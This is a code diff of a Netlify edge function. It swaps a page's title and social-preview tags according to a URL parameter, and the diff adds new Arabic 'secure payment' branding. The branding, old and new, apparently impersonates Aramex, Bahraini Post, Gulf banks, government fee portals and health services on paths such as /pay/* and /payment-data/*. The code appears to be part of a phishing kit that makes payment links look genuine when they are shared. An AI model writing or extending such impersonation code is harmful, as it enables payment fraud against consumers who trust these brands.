@@ -1,6 +1,5 @@
 import { Context } from "https://edge.netlify.com";
 
-// Company metadata mapping
 const companyMeta: Record<string, { title: string; description: string; image: string }> = {
   aramex: {
     title: "دفع آمن - أرامكس للشحن السريع 🚚",
@@ -67,111 +66,122 @@ const companyMeta: Record<string, { title: string; description: string; image: s
     description: "البريد البحريني الرسمي - خدمات بريدية وشحن احترافية - ادفع بأمان واحصل على خدمات توصيل سريعة وموثوقة في البحرين والعالم ✨",
     image: "/og-bahpost.jpg"
   },
+  chalets: {
+    title: "دفع آمن - حجز الشاليهات والاستراحات 🏖️",
+    description: "حجز شاليهات فاخرة واستراحات مريحة - ادفع بأمان واحجز إقامتك المثالية مع عروض حصرية وخدمات متميزة في جميع أنحاء الخليج 🌟",
+    image: "/og-chalets.jpg"
+  },
+  contracts: {
+    title: "دفع آمن - العقود والاتفاقيات القانونية 📄",
+    description: "تسديد العقود والاتفاقيات - أكمل دفعتك بأمان للعقود العقارية والتجارية والخدمية مع حماية قانونية كاملة وموثقة ✅",
+    image: "/og-contracts.jpg"
+  },
+  invoices: {
+    title: "دفع آمن - الفواتير والمستحقات 📋",
+    description: "دفع الفواتير إلكترونياً - سدد فواتيرك ومستحقاتك بكل سهولة وأمان مع تأكيد فوري ومتابعة دقيقة لجميع معاملاتك المالية 💰",
+    image: "/og-invoices.jpg"
+  },
+  government_payment: {
+    title: "دفع آمن - الخدمات الحكومية 🏛️",
+    description: "دفع الخدمات والرسوم الحكومية - سدد رسومك الحكومية إلكترونياً بأمان تام مع سداد، بنفت، مدى وجميع أنظمة الدفع الحكومية المعتمدة ✅",
+    image: "/og-government_payment.jpg"
+  },
+  health_links: {
+    title: "دفع آمن - الخدمات الصحية والطبية 🏥",
+    description: "دفع الخدمات الصحية والطبية - سدد فواتيرك الطبية، التأمين الصحي، والمستشفيات بأمان مع تأكيد فوري وخصوصية تامة 🩺",
+    image: "/og-health_links.jpg"
+  },
+  local_payment: {
+    title: "دفع آمن - المدفوعات المحلية 💳",
+    description: "خدمات الدفع المحلي السريع - سدد مدفوعاتك المحلية بسهولة وأمان مع دعم جميع وسائل الدفع المحلية المعتمدة في دول الخليج 🌍",
+    image: "/og-local_payment.jpg"
+  },
+  bank_pages: {
+    title: "دفع آمن - البنوك الخليجية 🏦",
+    description: "الدفع عبر البنوك الخليجية - اختر بنكك المفضل من أكثر من 50 بنك خليجي وأكمل معاملتك المالية بأمان وسرعة فائقة 💎",
+    image: "/og-bank_pages.jpg"
+  },
   default: {
-    title: "دفع آمن - منصة الدفع الموحدة 💳",
-    description: "نظام دفع إلكتروني آمن ومحمي بتشفير SSL - أكمل معاملاتك المالية بكل ثقة وأمان مع حماية كاملة لبياناتك 🔒✅",
+    title: "منصة الدفع الذكية - خدمات دفع آمنة لدول الخليج 💳",
+    description: "منصة متكاملة لخدمات الدفع الإلكتروني في دول الخليج - شحن، فواتير، عقود، خدمات حكومية وصحية بأمان وسهولة تامة",
     image: "/og-aramex.jpg"
   }
 };
 
 export default async (request: Request, context: Context) => {
-  const url = new URL(request.url);
-  const pathname = url.pathname;
-  
-  // Only process HTML requests
-  const acceptHeader = request.headers.get("accept") || "";
-  if (!acceptHeader.includes("text/html")) {
+  try {
+    const url = new URL(request.url);
+    
+    const acceptHeader = request.headers.get("accept") || "";
+    if (!acceptHeader.includes("text/html")) {
+      return context.next();
+    }
+
+    const response = await context.next();
+    const contentType = response.headers.get("content-type") || "";
+    
+    if (!contentType.includes("text/html")) {
+      return response;
+    }
+
+    let html = await response.text();
+
+    const companyParam = url.searchParams.get("company") || url.searchParams.get("service") || "default";
+    const meta = companyMeta[companyParam.toLowerCase()] || companyMeta.default;
+    
+    const fullImageUrl = `${url.origin}${meta.image}`;
+    const fullUrl = url.href;
+
+    console.log(`[Dynamic Meta] Params: company=${companyParam}, Title: ${meta.title.substring(0, 30)}...`);
+
+    const metaUpdates = [
+      { pattern: /<title>[^<]*<\/title>/gi, replacement: `<title>${meta.title}</title>` },
+      { pattern: /<meta\s+name="description"\s+content="[^"]*"\s*\/?>/gi, replacement: `<meta name="description" content="${meta.description}"/>` },
+      { pattern: /<meta\s+property="og:title"\s+content="[^"]*"\s*\/?>/gi, replacement: `<meta property="og:title" content="${meta.title}"/>` },
+      { pattern: /<meta\s+property="og:description"\s+content="[^"]*"\s*\/?>/gi, replacement: `<meta property="og:description" content="${meta.description}"/>` },
+      { pattern: /<meta\s+property="og:image"\s+content="[^"]*"\s*\/?>/gi, replacement: `<meta property="og:image" content="${fullImageUrl}"/>` },
+      { pattern: /<meta\s+property="og:url"\s+content="[^"]*"\s*\/?>/gi, replacement: `<meta property="og:url" content="${fullUrl}"/>` },
+      { pattern: /<meta\s+property="og:image:secure_url"\s+content="[^"]*"\s*\/?>/gi, replacement: `<meta property="og:image:secure_url" content="${fullImageUrl}"/>` },
+      { pattern: /<meta\s+property="og:image:alt"\s+content="[^"]*"\s*\/?>/gi, replacement: `<meta property="og:image:alt" content="${meta.title}"/>` },
+      { pattern: /<meta\s+name="twitter:title"\s+content="[^"]*"\s*\/?>/gi, replacement: `<meta name="twitter:title" content="${meta.title}"/>` },
+      { pattern: /<meta\s+name="twitter:description"\s+content="[^"]*"\s*\/?>/gi, replacement: `<meta name="twitter:description" content="${meta.description}"/>` },
+      { pattern: /<meta\s+name="twitter:image"\s+content="[^"]*"\s*\/?>/gi, replacement: `<meta name="twitter:image" content="${fullImageUrl}"/>` },
+      { pattern: /<meta\s+name="twitter:image:alt"\s+content="[^"]*"\s*\/?>/gi, replacement: `<meta name="twitter:image:alt" content="${meta.title}"/>` },
+    ];
+
+    for (const update of metaUpdates) {
+      html = html.replace(update.pattern, update.replacement);
+    }
+
+    if (!html.includes('property="og:url"') && !html.includes("property='og:url'")) {
+      html = html.replace(
+        /<head>/i,
+        `<head>\n    <meta property="og:url" content="${fullUrl}"/>`
+      );
+    }
+
+    if (!html.includes('property="og:image:secure_url"') && !html.includes("property='og:image:secure_url'")) {
+      html = html.replace(
+        /<meta property="og:image"/i,
+        `<meta property="og:image:secure_url" content="${fullImageUrl}"/>\n    <meta property="og:image"`
+      );
+    }
+
+    return new Response(html, {
+      headers: {
+        "content-type": "text/html; charset=utf-8",
+        "cache-control": "no-cache, no-store, must-revalidate, max-age=0",
+        "pragma": "no-cache",
+        "expires": "0",
+        "x-dynamic-meta": companyParam
+      }
+    });
+  } catch (error) {
+    console.error('[Dynamic Meta] Error:', error);
     return context.next();
   }
-
-  // Get the original response
-  const response = await context.next();
-  let html = await response.text();
-
-  // Extract company key from URL
-  // Patterns: /r/{id}?company=aramex or /pay/{id}?company=dhl
-  const companyParam = url.searchParams.get("company");
-  let companyKey = companyParam || "default";
-  
-  // Try to extract from path segments for stored links
-  const segments = pathname.split("/").filter(Boolean);
-  if (segments.length > 0) {
-    // Check if it's a payment/receipt path
-    const firstSegment = segments[0];
-    if (["r", "pay", "receipt"].includes(firstSegment)) {
-      // Use company parameter if available, otherwise use default
-      companyKey = companyParam || "default";
-    }
-  }
-
-  // Get metadata for the company
-  const meta = companyMeta[companyKey.toLowerCase()] || companyMeta.default;
-  const origin = url.origin;
-  const fullImageUrl = `${origin}${meta.image}`;
-  const fullUrl = url.href;
-
-  // Update meta tags in HTML
-  html = html
-    // Update title
-    .replace(/<title>.*?<\/title>/, `<title>${meta.title}</title>`)
-    // Update description
-    .replace(
-      /<meta name="description" content=".*?".*?>/,
-      `<meta name="description" content="${meta.description}" />`
-    )
-    // Update OG meta tags
-    .replace(
-      /<meta property="og:title" content=".*?".*?>/,
-      `<meta property="og:title" content="${meta.title}" />`
-    )
-    .replace(
-      /<meta property="og:description" content=".*?".*?>/,
-      `<meta property="og:description" content="${meta.description}" />`
-    )
-    .replace(
-      /<meta property="og:image" content=".*?".*?>/,
-      `<meta property="og:image" content="${fullImageUrl}" />`
-    )
-    .replace(
-      /<meta property="og:url" content=".*?".*?>/,
-      `<meta property="og:url" content="${fullUrl}" />`
-    )
-    // Update Twitter meta tags
-    .replace(
-      /<meta name="twitter:title" content=".*?".*?>/,
-      `<meta name="twitter:title" content="${meta.title}" />`
-    )
-    .replace(
-      /<meta name="twitter:description" content=".*?".*?>/,
-      `<meta name="twitter:description" content="${meta.description}" />`
-    )
-    .replace(
-      /<meta name="twitter:image" content=".*?".*?>/,
-      `<meta name="twitter:image" content="${fullImageUrl}" />`
-    )
-    .replace(
-      /<meta name="twitter:image:alt" content=".*?".*?>/,
-      `<meta name="twitter:image:alt" content="${meta.title}" />`
-    );
-
-  // Add og:url if not exists
-  if (!html.includes('property="og:url"')) {
-    html = html.replace(
-      /<meta property="og:image:type"/,
-      `<meta property="og:url" content="${fullUrl}" />\n    <meta property="og:image:type"`
-    );
-  }
-
-  return new Response(html, {
-    headers: {
-      ...response.headers,
-      "content-type": "text/html; charset=utf-8",
-      "cache-control": "public, max-age=0, must-revalidate"
-    }
-  });
 };
 
 export const config = {
-  path: "/*",
-  excludedPath: ["/assets/*", "/api/*", "/*.js", "/*.css", "/*.png", "/*.jpg", "/*.jpeg", "/*.svg", "/*.ico", "/*.json"]
+  path: ["/", "/r/*", "/pay/*", "/payment-data/*", "/recipient/*"],
 };
